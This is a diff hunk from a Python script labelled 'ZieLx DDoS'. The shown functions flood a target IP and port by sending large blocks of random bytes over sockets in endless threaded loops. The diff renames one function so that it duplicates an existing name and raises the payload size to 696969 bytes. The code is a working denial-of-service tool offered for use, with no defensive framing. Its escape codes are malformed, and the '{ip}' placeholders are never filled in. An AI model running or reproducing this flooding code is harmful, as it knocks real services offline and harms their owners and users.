@@ -77,8 +77,8 @@ def ddos2():
 			s.close()
 			print("\033]96m ZieLx DDoS Attack In Ip \033[91m{ip} \033[96mPort {port} \033[96m!!! ") 
 
-def ddos3():
-	data = random._urandom(20000)
+def ddos2():
+	data = random._urandom(696969)
 	i = random.choice(("[-]","[•]","[+]"))
 	while True:
 		try:
@@ -88,9 +88,9 @@ def ddos3():
 			for x in range(times):
 				s.send(data)
 			print(i +"\033]96m ZieLx DDoS Attack In Ip \033[91m{ip} \033[96mPort {port} \033[96m!!! ") 
-	        except:
+		except:
 			s.close()
-			print("\033]96m ZieLx DDoS Attack In Ip \033[91m{ip} \033[96mPort {port} \033[96m!!! ") 
+			print("\033]96m ZieLx DDoS Attack In Ip \033[91m{ip} \033[96mPort {port} \033[96m!!! ")  
 
 for y in range(threads):
 	if choice == 'ddos':
